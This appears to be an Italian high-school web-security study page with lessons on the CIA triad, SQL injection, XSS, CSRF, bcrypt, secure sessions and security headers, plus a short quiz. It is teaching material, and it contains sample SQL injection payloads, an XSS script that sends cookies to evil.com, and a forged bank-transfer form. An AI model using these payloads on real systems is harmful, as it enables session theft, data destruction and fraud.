@@ -1,0 +1,492 @@
+<!DOCTYPE html>
+<html lang="it">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Modulo 7 · Sicurezza Web — Informatica · Maturità</title>
+  <link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%230F2E42'/%3E%3Ctext x='50' y='68' font-family='Georgia,serif' font-size='52' font-style='italic' fill='%23C9A84C' text-anchor='middle'%3E7%3C/text%3E%3C/svg%3E">
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Cormorant+Garamond:ital,wght@0,400;0,500;0,600;0,700;1,400;1,500;1,600&family=Jost:ital,wght@0,300;0,400;0,500;1,300;1,400&display=swap" rel="stylesheet">
+  <link rel="stylesheet" href="../css/style.css">
+  <style>
+    code, pre { font-family: 'Courier New', Courier, monospace; }
+    pre { background: var(--beige-mid); padding: 1rem 1.2rem; border-radius: 4px; font-size: .84rem; overflow-x: auto; line-height: 1.6; border-left: 3px solid var(--color-primary); }
+    code { background: var(--beige-mid); padding: .1rem .3rem; border-radius: 2px; font-size: .88rem; }
+    .danger { border-left-color: #c0392b !important; }
+    .safe   { border-left-color: #27ae60 !important; }
+  </style>
+</head>
+<body>
+<div class="prog-wrap"><div class="prog-bar" id="pb"></div></div>
+
+<header class="topbar topbar--split">
+  <div class="topbar-brand-block">
+    <a href="../../index.html" class="topbar-back">← Portale</a>
+    <a href="../informatica.html" class="topbar-brand">Informatica</a>
+  </div>
+  <nav class="topbar-nav topbar-links">
+    <a class="topbar-link" href="argomenti.html">Argomenti</a>
+    <a class="topbar-link" href="mappe.html">Mappe</a>
+    <a class="topbar-link" href="flashcard.html">Flashcard</a>
+    <a class="topbar-link cta" href="quiz.html">Quiz</a>
+  </nav>
+</header>
+
+<nav class="nav">
+  <div class="nav-inner">
+    <button class="nav-btn active" data-sec="panoramica">Panoramica</button>
+    <button class="nav-btn" data-sec="cia">CIA Triad</button>
+    <button class="nav-btn" data-sec="injection">SQL Injection</button>
+    <button class="nav-btn" data-sec="xss-csrf">XSS e CSRF</button>
+    <button class="nav-btn" data-sec="password">Password e Sessioni</button>
+    <button class="nav-btn" data-sec="https">HTTPS e Header</button>
+    <button class="nav-btn" data-sec="quiz-mini">Mini-quiz</button>
+  </div>
+</nav>
+
+<!-- ══ PANORAMICA ══ -->
+<section class="section active" id="panoramica">
+  <div class="container">
+    <div class="hero">
+      <div class="eyebrow">Informatica · Modulo 7</div>
+      <h1 class="title">Sicurezza delle<br><em>Applicazioni Web</em></h1>
+      <p class="subtitle">Vulnerabilità, attacchi e tecniche di difesa per sviluppatori web.</p>
+    </div>
+    <div class="grid-2">
+      <div>
+        <div class="section-header" style="margin-top:0;">
+          <div class="section-tag">Perché la sicurezza conta</div>
+        </div>
+        <p>Una web app non sicura espone dati degli utenti, credenziali e dati aziendali. Gli attacchi più comuni sfruttano <strong>errori di programmazione</strong> — non falle del sistema operativo. Ogni sviluppatore deve conoscere le vulnerabilità base e come prevenirle.</p>
+        <p>OWASP (Open Web Application Security Project) pubblica annualmente la lista delle <strong>Top 10 vulnerabilità</strong> più critiche nelle applicazioni web, usata come riferimento mondiale.</p>
+        <div class="box-concetto">
+          <h4>Argomenti del modulo</h4>
+          <ul class="clean">
+            <li>CIA Triad: Confidenzialità, Integrità, Disponibilità</li>
+            <li>SQL Injection — attacco e difesa (prepared statements)</li>
+            <li>XSS (Cross-Site Scripting) — tipi e prevenzione</li>
+            <li>CSRF (Cross-Site Request Forgery) — token e SameSite</li>
+            <li>Hashing sicuro delle password (bcrypt, password_hash)</li>
+            <li>Sessioni sicure: HttpOnly, Secure, session_regenerate_id</li>
+            <li>HTTPS e TLS — crittografia in transito</li>
+            <li>Security headers: HSTS, CSP, X-Frame-Options</li>
+            <li>Defense in depth — principio di sicurezza a strati</li>
+          </ul>
+        </div>
+      </div>
+      <div>
+        <div class="box-concetto">
+          <h4>OWASP Top 10 — le vulnerabilità più comuni</h4>
+          <ol style="padding-left:1.2rem;line-height:2;">
+            <li>Broken Access Control</li>
+            <li>Cryptographic Failures</li>
+            <li><strong>Injection</strong> (SQL, NoSQL, OS…)</li>
+            <li>Insecure Design</li>
+            <li>Security Misconfiguration</li>
+            <li>Vulnerable Components</li>
+            <li>Authentication Failures</li>
+            <li>Software Integrity Failures</li>
+            <li><strong>Security Logging Failures</strong></li>
+            <li>Server-Side Request Forgery</li>
+          </ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ CIA TRIAD ══ -->
+<section class="section" id="cia">
+  <div class="container">
+    <div class="hero">
+      <div class="eyebrow">Modulo 7 · Fondamenti</div>
+      <h1 class="title">La triade <em>CIA</em></h1>
+    </div>
+    <div class="grid-3">
+      <div class="box-concetto">
+        <h4>Confidenzialità</h4>
+        <p>Solo gli utenti autorizzati possono accedere alle informazioni. Strumenti: autenticazione, autorizzazione, cifratura (HTTPS), controllo degli accessi.</p>
+      </div>
+      <div class="box-concetto">
+        <h4>Integrità</h4>
+        <p>I dati non vengono modificati in modo non autorizzato. Strumenti: checksum, firme digitali, vincoli DB, log delle modifiche, hashing.</p>
+      </div>
+      <div class="box-concetto">
+        <h4>Disponibilità</h4>
+        <p>I servizi sono accessibili quando gli utenti ne hanno bisogno. Minacce: attacchi DDoS, guasti hardware. Strumenti: backup, ridondanza, CDN.</p>
+      </div>
+    </div>
+    <div class="section-header">
+      <div class="section-tag">Concetti aggiuntivi</div>
+    </div>
+    <div class="grid-2">
+      <div>
+        <h3>Autenticazione vs Autorizzazione</h3>
+        <p><strong>Autenticazione</strong>: verifica l'identità — "chi sei?". Esempi: login con username/password, token JWT, biometria.</p>
+        <p><strong>Autorizzazione</strong>: verifica i permessi — "cosa puoi fare?". Esempi: ruoli (admin/user), ACL (Access Control List), permessi per risorsa.</p>
+      </div>
+      <div>
+        <h3>Principio del minimo privilegio</h3>
+        <p>Ogni utente, processo o componente dovrebbe avere <strong>solo i permessi strettamente necessari</strong> per svolgere la propria funzione, e niente di più.</p>
+        <p>Esempio: l'utente MySQL dell'applicazione web non dovrebbe avere permessi DROP TABLE o accesso ad altri database non necessari.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ SQL INJECTION ══ -->
+<section class="section" id="injection">
+  <div class="container">
+    <div class="hero">
+      <div class="eyebrow">Modulo 7 · Vulnerabilità</div>
+      <h1 class="title"><em>SQL Injection</em></h1>
+    </div>
+
+    <div class="section-header" style="margin-top:0;"><div class="section-tag">Come funziona l'attacco</div></div>
+    <p>SQL Injection avviene quando input non validato viene <strong>concatenato direttamente in una query SQL</strong>, permettendo all'attaccante di modificarne la logica.</p>
+
+    <div class="grid-2">
+      <div>
+        <p><strong>Codice vulnerabile:</strong></p>
+        <pre class="danger">// PERICOLOSO — MAI fare così
+$email = $_POST['email'];
+$sql = "SELECT * FROM utenti
+        WHERE email = '$email'";
+// Se email = ' OR '1'='1
+// La query diventa:
+// WHERE email = '' OR '1'='1'
+// → restituisce TUTTI gli utenti!</pre>
+      </div>
+      <div>
+        <p><strong>Input malevolo:</strong></p>
+        <pre class="danger">// Esempi di input malevolo:
+
+' OR '1'='1        → bypass login
+'; DROP TABLE utenti; --  → cancella tabella
+' UNION SELECT * FROM admin --  → espone dati
+admin'--           → commenta il resto SQL</pre>
+      </div>
+    </div>
+
+    <div class="section-header"><div class="section-tag">Difesa — Prepared Statements</div></div>
+    <p>L'unica difesa affidabile è separare struttura SQL e dati tramite <strong>prepared statements</strong>:</p>
+    <pre class="safe">// SICURO — prepared statement con MySQLi
+$stmt = $conn->prepare(
+    "SELECT * FROM utenti WHERE email = ?"
+);
+// Il ? è un segnaposto — MAI concatenare
+$stmt->bind_param("s", $email);  // "s" = string
+$stmt->execute();
+$result = $stmt->get_result();
+$user = $result->fetch_assoc();
+
+// Il driver MySQL tratta $email come PURO DATO,
+// non può mai diventare codice SQL.</pre>
+
+    <pre class="safe">// SICURO — con PDO (alternativa)
+$stmt = $pdo->prepare(
+    "SELECT * FROM utenti WHERE email = :email"
+);
+$stmt->bindParam(':email', $email);
+$stmt->execute();
+$user = $stmt->fetch();</pre>
+
+    <div class="box-concetto" style="margin-top:2rem;">
+      <h4>Regola d'oro</h4>
+      <p>MAI costruire query SQL concatenando variabili. Usare SEMPRE prepared statements per qualsiasi valore che proviene da input utente, URL, cookie o qualsiasi fonte esterna.</p>
+    </div>
+  </div>
+</section>
+
+<!-- ══ XSS E CSRF ══ -->
+<section class="section" id="xss-csrf">
+  <div class="container">
+    <div class="hero">
+      <div class="eyebrow">Modulo 7 · Vulnerabilità</div>
+      <h1 class="title">XSS <em>e</em> CSRF</h1>
+    </div>
+
+    <div class="section-header" style="margin-top:0;"><div class="section-tag">XSS — Cross-Site Scripting</div></div>
+    <div class="grid-2">
+      <div>
+        <p>XSS inietta JavaScript malevolo nell'HTML della pagina. Quando altri utenti caricano la pagina, il codice si esegue nel loro browser.</p>
+        <pre class="danger">// Commento utente con XSS
+&lt;script&gt;
+  // Ruba il cookie di sessione
+  fetch('https://evil.com?c='
+    + document.cookie);
+&lt;/script&gt;</pre>
+      </div>
+      <div>
+        <p><strong>Difesa PHP:</strong> <code>htmlspecialchars()</code> prima di stampare qualsiasi dato utente:</p>
+        <pre class="safe">// PRIMA di stampare nell'HTML:
+echo htmlspecialchars(
+    $input,
+    ENT_QUOTES,
+    'UTF-8'
+);
+// Converte: < → &amp;lt;  > → &amp;gt;
+//           " → &amp;quot;  ' → &amp;#039;
+// Il tag &lt;script&gt; diventa testo innocuo.</pre>
+        <p><strong>Difesa JS:</strong> usare <code>textContent</code> invece di <code>innerHTML</code> per inserire testo utente nel DOM.</p>
+      </div>
+    </div>
+
+    <div class="section-header"><div class="section-tag">CSRF — Cross-Site Request Forgery</div></div>
+    <div class="grid-2">
+      <div>
+        <p>Il browser della vittima autenticata viene indotto a inviare richieste non volute a un sito dove è loggata.</p>
+        <pre class="danger">&lt;!-- evil.com contiene form nascosto --&gt;
+&lt;form action="https://banca.com/bonifico"
+      method="POST"&gt;
+  &lt;input name="importo" value="1000"&gt;
+  &lt;input name="destinatario" value="hacker"&gt;
+&lt;/form&gt;
+&lt;script&gt;document.forms[0].submit();&lt;/script&gt;</pre>
+      </div>
+      <div>
+        <p><strong>Difesa:</strong> token CSRF univoco per sessione, verificato lato server:</p>
+        <pre class="safe">// Generare token CSRF in PHP
+session_start();
+if (empty($_SESSION['csrf_token'])) {
+    $_SESSION['csrf_token'] = bin2hex(
+        random_bytes(32)
+    );
+}
+
+// Nel form HTML:
+// &lt;input type="hidden" name="csrf_token"
+//   value="&lt;?= $_SESSION['csrf_token'] ?&gt;"&gt;
+
+// Verifica lato server:
+if ($_POST['csrf_token'] !==
+    $_SESSION['csrf_token']) {
+    die('CSRF token non valido');
+}</pre>
+        <p>Anche <code>SameSite=Strict</code> nei cookie previene CSRF: il browser non invia il cookie per richieste cross-site.</p>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ PASSWORD E SESSIONI ══ -->
+<section class="section" id="password">
+  <div class="container">
+    <div class="hero">
+      <div class="eyebrow">Modulo 7 · Autenticazione</div>
+      <h1 class="title">Password <em>e Sessioni</em></h1>
+    </div>
+
+    <div class="section-header" style="margin-top:0;"><div class="section-tag">Hashing sicuro delle password</div></div>
+    <div class="grid-2">
+      <div>
+        <p>Le password non vanno mai memorizzate in chiaro nel database. Usare sempre <strong>bcrypt</strong> tramite le funzioni PHP native:</p>
+        <pre class="safe">// REGISTRAZIONE
+$hash = password_hash(
+    $password,
+    PASSWORD_BCRYPT
+);
+// $hash include salt casuale automatico
+// Esempio: $2y$10$AbCdEf...
+// Salva $hash nel database
+
+// LOGIN (verifica)
+$stored_hash = /* leggi dal DB */;
+if (password_verify($password, $stored_hash)) {
+    // Autenticazione riuscita
+    session_start();
+    session_regenerate_id(true); // IMPORTANTE
+    $_SESSION['user_id'] = $user['id'];
+    header('Location: dashboard.php');
+} else {
+    echo 'Credenziali non valide';
+}</pre>
+      </div>
+      <div>
+        <blockquote>
+          MAI usare md5(), sha1() o sha256() per le password. Sono troppo veloci — una GPU può testare miliardi di hash al secondo. bcrypt è progettato per essere lento.
+        </blockquote>
+        <div class="box-concetto">
+          <h4>Perché bcrypt è sicuro</h4>
+          <ul class="clean">
+            <li>Salt casuale automatico — protegge da rainbow table attack</li>
+            <li>Lento per design (cost factor) — resiste a brute force</li>
+            <li>Adattativo: il cost factor può aumentare col tempo</li>
+            <li>password_verify() è resistente a timing attack</li>
+          </ul>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-header"><div class="section-tag">Sessioni sicure in PHP</div></div>
+    <pre class="safe">session_start(); // PRIMA di qualsiasi output
+
+// Dopo login riuscito — SEMPRE rigenerare l'ID
+session_regenerate_id(true); // previene session fixation
+$_SESSION['user_id'] = $user_id;
+$_SESSION['login_time'] = time();
+
+// Configurazione cookie sicuri (in php.ini o runtime):
+ini_set('session.cookie_httponly', 1);  // JS non può leggere il cookie
+ini_set('session.cookie_secure', 1);    // solo HTTPS
+ini_set('session.cookie_samesite', 'Strict'); // previene CSRF
+
+// Timeout manuale (es. 30 minuti)
+if (isset($_SESSION['login_time'])) {
+    if (time() - $_SESSION['login_time'] > 1800) {
+        session_destroy(); // sessione scaduta
+        header('Location: login.php');
+        exit;
+    }
+}
+
+// Logout
+session_destroy(); // elimina la sessione lato server</pre>
+  </div>
+</section>
+
+<!-- ══ HTTPS E HEADER ══ -->
+<section class="section" id="https">
+  <div class="container">
+    <div class="hero">
+      <div class="eyebrow">Modulo 7 · Trasporto e Header</div>
+      <h1 class="title">HTTPS <em>e Security Headers</em></h1>
+    </div>
+
+    <div class="section-header" style="margin-top:0;"><div class="section-tag">HTTPS e TLS</div></div>
+    <div class="grid-2">
+      <div>
+        <p>HTTPS usa <strong>TLS</strong> (Transport Layer Security) per crittografare tutto il traffico tra browser e server. Garantisce tre proprietà:</p>
+        <ul class="clean">
+          <li><strong>Confidenzialità</strong>: nessuno può intercettare e leggere il traffico</li>
+          <li><strong>Integrità</strong>: nessuno può modificare i dati in transito</li>
+          <li><strong>Autenticazione</strong>: il certificato digitale verifica l'identità del server</li>
+        </ul>
+        <p>SSL è il predecessore deprecato di TLS. TLS 1.2 e 1.3 sono le versioni attuali. SSL 2.0 e 3.0 sono insicuri e disabilitati.</p>
+      </div>
+      <div>
+        <div class="box-concetto">
+          <h4>In sviluppo locale vs produzione</h4>
+          <p>In locale: HTTP è accettabile per lo sviluppo. In produzione: HTTPS è <strong>obbligatorio</strong> per qualsiasi sito che gestisce dati utente, login o pagamenti. Let's Encrypt offre certificati TLS gratuiti.</p>
+        </div>
+      </div>
+    </div>
+
+    <div class="section-header"><div class="section-tag">Security Headers</div></div>
+    <pre>// Aggiungere header di sicurezza in PHP:
+
+// HSTS: forza HTTPS per 1 anno
+header('Strict-Transport-Security: max-age=31536000; includeSubDomains');
+
+// CSP: limita le fonti di script (previene XSS)
+header("Content-Security-Policy: default-src 'self'; script-src 'self'");
+
+// Impedisce il sito di essere caricato in iframe (clickjacking)
+header('X-Frame-Options: DENY');
+
+// Impedisce al browser di indovinare il MIME type
+header('X-Content-Type-Options: nosniff');
+
+// Nasconde informazioni sul server
+header_remove('X-Powered-By'); // rimuove "PHP/8.x"</pre>
+
+    <div class="section-header"><div class="section-tag">Defense in depth — sicurezza a strati</div></div>
+    <div class="timeline">
+      <div class="tl-item">
+        <span class="tl-year">Layer 1</span>
+        <div class="tl-title">Validazione input</div>
+        <div class="tl-body">Validazione client (JS) per UX + validazione server (PHP) per sicurezza. Whitelist dei valori consentiti dove possibile.</div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-year">Layer 2</span>
+        <div class="tl-title">Prepared statements</div>
+        <div class="tl-body">MAI concatenare input in SQL. Ogni query con parametri utente usa bind_param().</div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-year">Layer 3</span>
+        <div class="tl-title">Output escaping</div>
+        <div class="tl-body">htmlspecialchars() prima di stampare dati utente nell'HTML. textContent in JS.</div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-year">Layer 4</span>
+        <div class="tl-title">HTTPS + header sicuri</div>
+        <div class="tl-body">TLS per crittografare il traffico. HSTS, CSP, X-Frame-Options per proteggere il browser.</div>
+      </div>
+      <div class="tl-item">
+        <span class="tl-year">Layer 5</span>
+        <div class="tl-title">Autenticazione sicura</div>
+        <div class="tl-body">bcrypt per le password, sessioni con HttpOnly+Secure, session_regenerate_id dopo login, timeout.</div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<!-- ══ MINI-QUIZ ══ -->
+<section class="section" id="quiz-mini">
+  <div class="container">
+    <div class="hero">
+      <div class="eyebrow">Modulo 7 · Verifica</div>
+      <h1 class="title">Mini-<em>quiz</em></h1>
+    </div>
+
+    <div class="quiz">
+      <div class="quiz-lbl">Sicurezza Web · 4 domande</div>
+
+      <div class="qd" data-correct="1">
+        <p class="q">1. Quale tecnica previene efficacemente SQL Injection?</p>
+        <div class="qopts">
+          <button class="qo">htmlspecialchars() su ogni input</button>
+          <button class="qo">Prepared statements con bind_param()</button>
+          <button class="qo">Usare solo GET invece di POST</button>
+          <button class="qo">Cifrare il database con AES</button>
+        </div>
+        <div class="qfb"></div>
+      </div>
+
+      <div class="qd" data-correct="2">
+        <p class="q">2. Cosa fa httpOnly su un cookie di sessione?</p>
+        <div class="qopts">
+          <button class="qo">Impedisce l'invio del cookie su HTTPS</button>
+          <button class="qo">Limita la durata del cookie a 1 ora</button>
+          <button class="qo">Impedisce a JavaScript di leggere il cookie</button>
+          <button class="qo">Cripta il contenuto del cookie</button>
+        </div>
+        <div class="qfb"></div>
+      </div>
+
+      <div class="qd" data-correct="0">
+        <p class="q">3. XSS e SQL Injection differiscono perché:</p>
+        <div class="qopts">
+          <button class="qo">XSS inietta JS nell'HTML, SQL Injection inietta SQL nelle query</button>
+          <button class="qo">XSS attacca il server, SQL Injection attacca il browser</button>
+          <button class="qo">Sono lo stesso attacco con nome diverso</button>
+          <button class="qo">SQL Injection usa htmlspecialchars() per attaccare</button>
+        </div>
+        <div class="qfb"></div>
+      </div>
+
+      <div class="qd" data-correct="1">
+        <p class="q">4. Quale funzione PHP va usata per memorizzare password in modo sicuro?</p>
+        <div class="qopts">
+          <button class="qo">md5($password)</button>
+          <button class="qo">password_hash($password, PASSWORD_BCRYPT)</button>
+          <button class="qo">base64_encode($password)</button>
+          <button class="qo">sha1($password)</button>
+        </div>
+        <div class="qfb"></div>
+      </div>
+    </div>
+  </div>
+</section>
+
+<footer class="site-footer">
+  <div class="footer-quote-final">
+    «La sicurezza non è un prodotto, ma un processo.»
+    <cite>— Bruce Schneier, crittografo e esperto di sicurezza</cite>
+  </div>
+</footer>
+
+<script src="../js/main.js"></script>
+</body>
+</html>
